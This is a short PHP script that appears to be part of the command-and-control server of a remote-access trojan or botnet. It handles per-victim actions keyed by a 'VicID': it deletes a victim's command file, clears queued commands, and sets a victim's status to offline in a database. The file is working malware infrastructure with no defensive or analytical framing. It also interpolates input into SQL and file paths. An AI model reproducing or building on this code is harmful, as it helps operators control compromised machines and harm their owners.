<?php
include 'config.php';
$_GET   = filter_input_array(INPUT_GET, FILTER_SANITIZE_STRING);
$_POST  = filter_input_array(INPUT_POST, FILTER_SANITIZE_STRING);
$Command = CheckData($_GET['command']);
$ID = CheckData($_GET['VicID']);
switch ($Command) {
	case "Uninstall":
          unlink("Clients/".$ID.".txt");           
		break;

	case "CleanCommands":
        $commandfile = fopen("Clients/".$ID.".txt", "w");
        fwrite($commandfile, "");
        fclose($commandfile);
		break;
		
		case "Offline":
          $sql = "UPDATE Clients SET Status='Offline' WHERE VicID='$ID'";
          $UpdateClient = mysqli_query($conn,$sql);
		  break;

	default:
		break;
}

function CheckData($data) {
    $data = trim($data);
    $data = stripslashes($data);
    $data = htmlspecialchars($data);
    $data = strip_tags($data);
    $data = escapeshellcmd($data);
    return $data;
  }
?>